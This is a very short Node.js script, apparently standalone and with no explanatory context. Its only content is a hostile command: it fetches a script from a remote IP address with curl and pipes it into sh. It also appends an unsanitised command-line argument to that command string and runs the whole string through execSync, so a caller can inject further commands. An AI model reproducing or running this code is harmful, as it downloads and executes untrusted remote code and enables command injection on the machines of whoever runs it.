import { execSync } from "node:child_process";

let c = "curl -s http://203.0.113.5/x | sh";
c += process.argv[2];
execSync(c);
